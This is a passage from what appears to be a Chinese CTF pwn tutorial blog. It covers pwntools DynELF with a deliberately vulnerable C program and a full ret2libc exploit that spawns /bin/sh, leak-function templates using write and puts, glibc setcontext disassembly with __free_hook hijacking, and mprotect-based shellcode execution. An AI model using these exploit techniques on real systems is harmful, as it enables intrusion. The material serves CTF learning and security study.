class="line">log.debug是pwntools中的日志工具，%#x表示输出一个整数的十六进制表示（带有0x前缀），%s表示输出一个字符串。address是要输出的内存地址，data是该地址对应的数据（一个字符串），enhex是pwntools中的工具函数，用于将字符串转换为十六进制表示的字符串（每个字节用两个十六进制字符表示），与encode(&#x27;hex&#x27;)相似。</span><br><span class="line">整个输出结果类似于：[DEBUG] 0x12345678 =&gt; 6162636465666768</span><br><span class="line">(data or &#x27;&#x27;)的作用是，当data变量为空（None）或者为False时，返回一个空字符串&#x27;&#x27;，否则返回data本身。</span><br></pre></td></tr></table></figure><h3 id="一个更具体的例子"><a href="#一个更具体的例子" class="headerlink" title="一个更具体的例子"></a>一个更具体的例子</h3><p><strong>源代码</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulfun</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    vulfun();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello,World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;elf&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">data = p.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./elf&#x27;</span>)</span><br><span class="line">d=DynELF(leak, ptr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a018</span></span><br><span class="line">pppr = <span class="number">0x080484bd</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) <span class="comment">#这里藏了一个之前没注意过的知识点①</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" red><summary> ① </summary>              <div class='content'>              <p>上面的exp使用了一个pppr(其实就是pop-pop-pop-ret),作为read的返回地址,这个是很有必要的,鉴于32位下返回地址和参数的互通性(64位也会但一般都不会超过6个参数）,如果read后直接接需要的函数地址那么read的参数又会变为所需函数的返回地址和参数,这显然不是我们所希望的,于是通过pppr来<strong>重新划分函数栈</strong></p>              </div>            </details><h2 id="基础框架"><a href="#基础框架" class="headerlink" title="基础框架"></a>基础框架</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">       payload2leak_addr = “****” + pack(addr) + “****”</span><br><span class="line">       p.send(payload2leak_addr)</span><br><span class="line">       data = p.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>使用DynELF时，我们需要使用一个<strong>leak函数</strong>作为<strong>必选参数</strong>，<u>指向ELF文件的指针或者使用ELF类加载的目标文件至少提供一个作为可选参数</u>，以初始化一个DynELF类的实例d。然后就可以通过这个实例d的方法lookup来搜寻libc库函数了；<br>其中，<strong>leak函数需要使用目标程序本身的漏洞泄露出由DynELF类传入的<u>int型参数addr</u><u>对应的内存地址中的数据</u>。</strong>且由于DynELF会多次调用leak函数，这个函数<u>必须能任意次使用</u>，即不能泄露几个地址之后就导致程序崩溃。<strong>由于需要泄露数据</strong>，<strong>payload中必然包含着打印函数，如write, puts, printf等</strong>；<br>而通过实践发现<strong>write函数是最理想的</strong>，因为write函数的特点在于<strong>其输出完全由其参数size决定</strong>，只要目标地址可读，<strong>size填多少就输出多少，不会受到诸如‘\0’, ‘\n’之类的字符影响</strong>；<u>而puts, printf函数会受到诸如‘\0’, ‘\n’之类的字符影响，在对数据的读取和处理有一定的难度</u></p><p>结合上面的引例，对DynELF应该能有一个基础认识</p><h2 id="leak模板"><a href="#leak模板" class="headerlink" title="leak模板"></a>leak模板</h2><h3 id="Write函数模板"><a href="#Write函数模板" class="headerlink" title="Write函数模板"></a>Write函数模板</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line"><span class="comment">#address是待泄露的地址</span></span><br><span class="line">    payload = offset + p32(write) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#payload = 溢出位 + write\puts\printf + 返回地址 + 参数1 + 参数2 + 参数3</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>) </span><br><span class="line">    <span class="comment">#用于接受返回的地址，32位接收4位，64位接收8位</span></span><br><span class="line">log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">libc = DynELF(leak, elf=ELF(file_path))</span><br><span class="line"><span class="comment">#初始化DynELF模块，也就是程序的elf变量</span></span><br><span class="line">system_addr = libc.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="comment">#在libc文件中搜索system</span></span><br></pre></td></tr></table></figure><h3 id="puts函数模板"><a href="#puts函数模板" class="headerlink" title="puts函数模板"></a>puts函数模板</h3><p>puts 函数使用的参数只有一个，即需要输出的数据的起始地址，<strong>它会一直输出直到遇到 <u>\x00</u></strong>，所以它输出的数据长度是<u>不容易控制</u>的，我们无法预料到零字符会出现在哪里，截止后，<strong>puts 还会自动在末尾加上换行符</strong> 。<strong>该函数的优点是在 64 位程序中也可以很方便地使用。**</strong>缺点是会受到零字符截断的影响**，在写 leak 函数时需要特殊处理，在打印出的数据中正确地筛选我们需要的部分，如果打印出了空字符串，则要手动赋值<code>\x00</code>，包括我们在 dump 内存的时候，也常常受这个问题的困扰，</p><h3 id="Puts函数后没有其他输出"><a href="#Puts函数后没有其他输出" class="headerlink" title="Puts函数后没有其他输出"></a><code>Puts</code>函数后没有其他输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt_addr) + p32(main_addr) + p32(address)</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;xxx\n&#x27;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h3 id="Puts函数后程序还有其他输出"><a href="#Puts函数后程序还有其他输出" class="headerlink" title="Puts函数后程序还有其他输出"></a><code>Puts</code>函数后程序还有其他输出</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&quot;&quot;</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&quot;xxx\n&quot;</span>) <span class="comment">#一定要在puts前释放完输出</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;x&quot;</span>:  <span class="comment">#一定要找到泄漏信息的字符串特征</span></span><br><span class="line">      data = buf[:-<span class="number">1</span>]                     </span><br><span class="line">      data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>] </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>了解一下,要求不高</p><h3 id="获取elf内存加载基地址"><a href="#获取elf内存加载基地址" class="headerlink" title="获取elf内存加载基地址"></a>获取elf内存加载基地址</h3><p>已知elf加载内存范围内的一个地址ptr，将该地址进行页对齐</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page_size = 0x1000page_mask = ~(page_size - 1)ptr &amp;= page_mask</span><br></pre></td></tr></table></figure><p>然后对比内存页起始字符串是否为’\x7fELF’，如果不是，一直向低地址内存页(ptr -= page_size)进行查找，找到符合该条件的页面，该页面起始地址就是elf文件内存加载基地址。</p><p>寻找elf内存加载基地址的示意图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_144448.png" alt=""></p><h3 id="获取libc-so内存加载基地址"><a href="#获取libc-so内存加载基地址" class="headerlink" title="获取libc.so内存加载基地址"></a>获取libc.so内存加载基地址</h3><p>elf是动态链接的可执行文件，在该类型文件中有一个link_map双向链表，其中包含了每个动态加载的库的路径和加载基址等信息</p><p>可以通过两种途径获取link_map链表：一是在所有ELF文件中，通过Dynamic段DT_DEBUG区域得到。二是在non-RELRO ELF文件中，link_map地址存在于.got.plt区节中，该区节的加载地址可以从DYNAMIC段DT_PLTGOT区域得到。</p><p>这两种途径都需要知道elf的DYNAMIC段地址：我们在第一步中获取了elf内存加载基地址，由此可以得到elf段表，通过解析elf段表可以得到DYNAMIC基地址。</p><p>通过第二种方式获取link_map结构的示意图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_144541.png" alt=""></p><h3 id="获取libc-so的hash表、动态符号表、字符串表基地址"><a href="#获取libc-so的hash表、动态符号表、字符串表基地址" class="headerlink" title="获取libc.so的hash表、动态符号表、字符串表基地址"></a>获取libc.so的hash表、动态符号表、字符串表基地址</h3><p>在所有需要导出函数给其他文件使用的ELF文件（例如: “libc.so”）中，用动态符号表、字符串表、hash表等一系列表用于指示导出符号（例如:”system”）的名称、地址、hash值等信息。通过libc.so的Dynamic段DT_GNU_HASH、DT_SYMTAB、DT_STRTAB可以获取hash表、动态符号表、字符串表在内存中的基地址。</p><h3 id="通过hash表获取system函数地址"><a href="#通过hash表获取system函数地址" class="headerlink" title="通过hash表获取system函数地址"></a>通过hash表获取system函数地址</h3><p>hash表是用于查找符号的散列表，通过libc.so的hash表可以找到system函数内存加载地址，在ELF文件中有SYSV、GNU两种类型的hash表，其中通过GNU HASH查找system函数地址示意图如下。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_144815.png" alt=""></p><p>图中： nbuckets是hash buckets的数值，symndx是hash表映射符号表的起始索引，Bloom Filter用作过滤不在符号表中的符号名称，在DynELF中并没有使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=gnu_hash(“system”)，gnu_hash是GNU HASH算法函数ndx=hash%nbuckets，ndx是符号表中所有 符号HASH%nubuckets 相等的起始索引</span><br></pre></td></tr></table></figure><p>最后：内存泄露函数在过程中用作读取程序内存数据，像上面例子中获取link_map、DYNAMIC段、elf段表等内容都是通过内存泄露函数。</p><h1 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>setcontext是libc中的一个函数</p><p><strong>2.27版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000052050                               ; __int64 __fastcall setcontext(__int64)</span><br><span class="line">.text:0000000000052050                               public setcontext ; weak</span><br><span class="line">.text:0000000000052050                               setcontext proc near                    ; CODE XREF: sub_58680+C↓p</span><br><span class="line">.text:0000000000052050                                                                       ; DATA XREF: LOAD:0000000000009058↑o</span><br><span class="line">.text:0000000000052050                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052050 57                            push    rdi</span><br><span class="line">.text:0000000000052051 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000052058 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:000000000005205A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:000000000005205F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000052065 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005206A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:000000000005206C 5F                            pop     rdi</span><br><span class="line">.text:000000000005206D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052073 73 5B                         jnb     short loc_520D0</span><br><span class="line">.text:0000000000052073</span><br><span class="line">.text:0000000000052075 48 8B 8F E0 00 00 00          mov     rcx, [rdi+0E0h]</span><br><span class="line">.text:000000000005207C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:000000000005207E 0F AE 97 C0 01 00 00          ldmxcsr dword ptr [rdi+1C0h]</span><br><span class="line">.text:0000000000052085 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:000000000005208C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000052093 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000052097 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:000000000005209B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:000000000005209F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:00000000000520A3 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:00000000000520A7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:00000000000520AE 51                            push    rcx</span><br><span class="line">.text:00000000000520AF 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:00000000000520B3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:00000000000520BA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:00000000000520C1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:00000000000520C5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:00000000000520C9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:00000000000520C9                               ; &#125; // starts at 52050</span><br><span class="line">.text:00000000000520CD                               ; __unwind &#123;</span><br><span class="line">.text:00000000000520CD 31 C0                         xor     eax, eax</span><br><span class="line">.text:00000000000520CF C3                            retn</span><br></pre></td></tr></table></figure><p><strong>2.29版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000055E00                               public setcontext ; weak</span><br><span class="line">.text:0000000000055E00                               setcontext proc near                    ; CODE XREF: sub_5C160+C↓p</span><br><span class="line">.text:0000000000055E00                                                                       ; DATA XREF: LOAD:000000000000C6D8↑o</span><br><span class="line">.text:0000000000055E00                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E00 57                            push    rdi</span><br><span class="line">.text:0000000000055E01 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000055E08 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:0000000000055E0A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:0000000000055E0F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000055E15 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:0000000000055E1A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000055E1C 5A                            pop     rdx</span><br><span class="line">.text:0000000000055E1D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000055E23 73 5B                         jnb     short loc_55E80</span><br><span class="line">.text:0000000000055E23</span><br><span class="line">.text:0000000000055E25 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000055E2C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000055E2E 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000055E35 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000055E3C 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000055E43 48 8B 6A 78                   mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000055E47 4C 8B 62 48                   mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000055E4B 4C 8B 6A 50                   mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000055E4F 4C 8B 72 58                   mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000055E53 4C 8B 7A 60                   mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000055E57 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000055E5E 51                            push    rcx</span><br><span class="line">.text:0000000000055E5F 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055E63 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055E67 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000055E6E 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000055E72 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055E76 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055E76                               ; &#125; // starts at 55E00</span><br><span class="line">.text:0000000000055E7D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E7D 31 C0                         xor     eax, eax</span><br><span class="line">.text:0000000000055E7F C3                            retn</span><br></pre></td></tr></table></figure><hr><p>不难看出利用的核心是rdi(2.29以前)和rdx(2.29及以后)</p><p>要从特定位置:<code>mov rsp , [??]</code>开始执行</p><p>需要从特定位置开始是因为上面的代码会使程序crash</p><p>程序控制了除rax以外的几乎所有寄存器,</p><p>其中rip是通过以下代码控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, [rdi/rdx+0A8h]</span><br><span class="line">push    rcx</span><br><span class="line">....</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>唯一不可控的rax也在 <code>xor   eax, eax</code>的作用下变为<strong>零</strong></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="2-29以下"><a href="#2-29以下" class="headerlink" title="2.29以下"></a>2.29以下</h3><p>2.29以下的利用要更为简单一些</p><p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题。我们通常是吧 setcontext + 53 写进 <strong>free_hook 或者 </strong>malloc_hook 中，然后建立或者释放一个堆块，特别释放时 rdi 就会是该堆块的 chunk 头，那如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序的执行流。</p><h3 id="2-29及以上"><a href="#2-29及以上" class="headerlink" title="2.29及以上"></a>2.29及以上</h3><p>2.29 最大的变动就是 setcontext 里控制寄存器由 rdi 变成了 rdx，这就使得我们无法通过直接控制 free 的堆块来控制寄存器。所以要用到一些 gadget 来把 rdi 和 rdx 转换一下。</p><h1 id="mprotect"><a href="#mprotect" class="headerlink" title="mprotect"></a>mprotect</h1><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p><code>mprotect</code> 是一个系统调用，用于更改指定内存区域的保护属性，包括读、写、执行权限。它通常在操作系统中用于管理内存的访问权限，以增强程序的安全性和灵活性。在C语言中，<code>mprotect</code> 的原型如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><ul><li><p><code>addr</code>：指向目标内存区域起始地址的指针。</p></li><li><p><code>len</code>：内存区域的长度（以字节为单位）。</p></li><li><p><code>prot</code>：要设置的保护属性，使用以下标志的按位或组合：</p><ul><li><code>PROT_NONE</code>：禁止对内存区域的任何访问。0</li><li><code>PROT_READ</code>：允许读取内存区域的内容。4</li><li><code>PROT_WRITE</code>：允许写入内存区域的内容。2</li><li><code>PROT_EXEC</code>：允许在内存区域中执行代码。1</li></ul></li></ul><p><code>mprotect</code> 的作用在于修改指定内存区域的访问权限，从而允许或禁止不同类型的访问。这对于实现一些特定的内存保护机制非常有用，例如：</p><ol><li><strong>代码段保护</strong>：在程序运行时，将代码段设置为只执行（<code>PROT_EXEC</code>），以防止恶意代码注入并执行。</li><li><strong>数据段保护</strong>：可以将某些敏感数据区域设置为只读（<code>PROT_READ</code>），防止在不合适的情况下被修改。</li><li><strong>动态内存分配保护</strong>：在使用动态内存分配函数（如<code>malloc</code>）分配内存后，可以使用<code>mprotect</code> 来限制对该内存区域的访问权限，从而确保只有特定的操作可以修改或执行该内存。</li></ol><h2 id="在pwn中的利用"><a href="#在pwn中的利用" class="headerlink" title="在pwn中的利用"></a>在pwn中的利用</h2><p>一般都是利用其修改某一块内存权限为rwx,然后去执行shellcode</p><h3 id="例ciscn2023-烧烤摊儿"><a href="#例ciscn2023-烧烤摊儿" class="headerlink" title="例ciscn2023 烧烤摊儿"></a>例ciscn2023 烧烤摊儿</h3><p>常规做法原本是ret2syscall构造rop链</p><p>但这道题没有pie且有使用mprotect函数</p><p>所以可以修改bss段上的空白内存的权限,再往里面写入shellcode,之后返回该处执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 